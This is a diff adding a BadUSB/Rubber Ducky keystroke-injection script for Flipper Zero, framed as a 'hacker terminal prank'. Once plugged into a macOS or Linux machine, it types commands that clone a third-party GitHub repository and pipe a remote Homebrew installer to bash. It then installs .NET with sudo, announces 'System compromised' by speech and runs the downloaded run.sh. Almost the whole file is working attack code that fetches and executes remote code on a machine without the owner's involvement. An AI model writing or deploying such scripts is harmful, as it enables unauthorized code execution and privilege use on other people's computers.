@@ -1,0 +1,156 @@
+REM Hacker Terminal Prank - Universal Script
+REM For use with Flipper Zero BadUSB/RubberDucky
+REM Auto-detects OS and runs appropriate commands
+REM Created: June 2025
+
+REM ============= STAGE 1: OPEN TERMINAL =============
+
+REM Try macOS Terminal first
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 1500
+
+REM ============= STAGE 2: DETECT OS AND EXECUTE =============
+
+STRING clear && echo "Initializing system analysis..."
+ENTER
+DELAY 300
+
+STRING OS_TYPE=$(uname -s)
+ENTER
+DELAY 100
+
+STRING if [ "$OS_TYPE" = "Darwin" ]; then
+ENTER
+
+REM ==================== macOS COMMANDS ======================
+STRING   echo "macOS detected. Preparing hacker simulation..."
+ENTER
+DELAY 300
+
+REM Set terminal to full screen
+GUI f
+DELAY 500
+
+REM Create a temporary directory to work in
+STRING   mkdir -p /tmp/hacker_prank && cd /tmp/hacker_prank
+ENTER
+DELAY 300
+
+REM Clone the repository
+STRING   git clone https://github.com/Gr3y-foX/linux_hacker_theme_video.git || echo "Failed to clone repository"
+ENTER
+DELAY 5000
+
+STRING   cd linux_hacker_theme_video || exit 1
+ENTER
+DELAY 300
+
+REM Check if .NET is installed, if not try to install via Homebrew
+STRING   if ! command -v dotnet &> /dev/null; then
+ENTER
+STRING     echo "Installing .NET runtime..."
+ENTER
+STRING     if ! command -v brew &> /dev/null; then
+ENTER
+STRING       echo "Homebrew not found. Installing Homebrew..."
+ENTER
+STRING       /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+ENTER
+STRING       eval "$(/opt/homebrew/bin/brew shellenv)" || eval "$(/usr/local/bin/brew shellenv)"
+ENTER
+STRING     fi
+ENTER
+STRING     brew install dotnet || echo "Failed to install .NET"
+ENTER
+STRING   fi
+ENTER
+DELAY 5000
+
+REM Play dramatic sound and use text-to-speech
+STRING   (afplay /System/Library/Sounds/Sosumi.aiff &) 2>/dev/null
+ENTER
+STRING   say -v Alex "Warning. System compromised. Initiating hack sequence." &
+ENTER
+DELAY 1000
+
+REM ==================== LINUX COMMANDS ======================
+STRING else
+ENTER
+STRING   echo "Linux detected. Preparing hacker simulation..."
+ENTER
+DELAY 300
+
+REM Switch to full screen mode for most terminal apps
+F11
+DELAY 500
+
+REM Create a temporary directory to work in
+STRING   mkdir -p /tmp/hacker_prank && cd /tmp/hacker_prank
+ENTER
+DELAY 300
+
+REM Clone the repository
+STRING   git clone https://github.com/Gr3y-foX/linux_hacker_theme_video.git || echo "Failed to clone repository"
+ENTER
+DELAY 5000
+
+STRING   cd linux_hacker_theme_video || exit 1
+ENTER
+DELAY 300
+
+REM Try to install .NET if not already installed
+STRING   if ! command -v dotnet &> /dev/null; then
+ENTER
+STRING     echo "Installing .NET runtime..."
+ENTER
+STRING     if command -v apt-get &> /dev/null; then
+ENTER
+STRING       sudo apt-get update && sudo apt-get install -y dotnet-sdk-9.0 || sudo apt-get install -y dotnet-sdk-8.0 || sudo apt-get install -y dotnet-sdk-6.0
+ENTER
+STRING     elif command -v dnf &> /dev/null; then
+ENTER
+STRING       sudo dnf install -y dotnet-sdk-9.0 || sudo dnf install -y dotnet-sdk-8.0 || sudo dnf install -y dotnet-sdk-6.0
+ENTER
+STRING     elif command -v pacman &> /dev/null; then
+ENTER
+STRING       sudo pacman -Sy dotnet-sdk
+ENTER
+STRING     fi
+ENTER
+STRING   fi
+ENTER
+DELAY 5000
+
+REM Beep and try text-to-speech if available
+STRING   (for i in {1..5}; do echo -en "\a"; sleep 0.5; done) &
+ENTER
+STRING   if command -v espeak &> /dev/null; then
+ENTER
+STRING     espeak "Warning. System compromised. Initiating hack sequence." &
+ENTER
+STRING   elif command -v spd-say &> /dev/null; then
+ENTER
+STRING     spd-say "Warning. System compromised. Initiating hack sequence." &
+ENTER
+STRING   fi
+ENTER
+DELAY 1000
+
+STRING fi
+ENTER
+DELAY 300
+
+REM ============= STAGE 3: COMMON EXECUTION =============
+STRING clear && echo "SYSTEM BREACH DETECTED" && echo "UNAUTHORIZED ACCESS IN PROGRESS..."
+ENTER
+DELAY 1000
+
+STRING chmod +x run.sh && ./run.sh
+ENTER
+
+REM The hacker terminal will now run and display the visuals
+REM Script ends here, letting the application run
